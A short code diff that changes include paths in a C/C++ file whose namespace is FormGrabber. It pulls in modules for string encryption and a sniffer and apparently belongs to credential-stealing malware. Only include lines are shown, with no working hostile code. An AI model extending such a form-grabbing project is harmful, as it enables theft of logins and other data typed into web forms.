@@ -1,7 +1,10 @@
-#include "system.h"
-#include "core\sniffer.h"
-#include "core\file.h"
-#include "Manager.h"
+#include "../../../core/include/core/type.h"
+#include "../../../core/include/core/misc.h"
+#include "../../../core/include/core/memory.h"
+#include "../../include/Manager.h"
+#include "../../../core/include/core/string_crypt.h"
+#include "../../../core/include/core/string.h"
+#include "../../../core/include/core/sniffer.h"
 
 namespace FormGrabber
 {
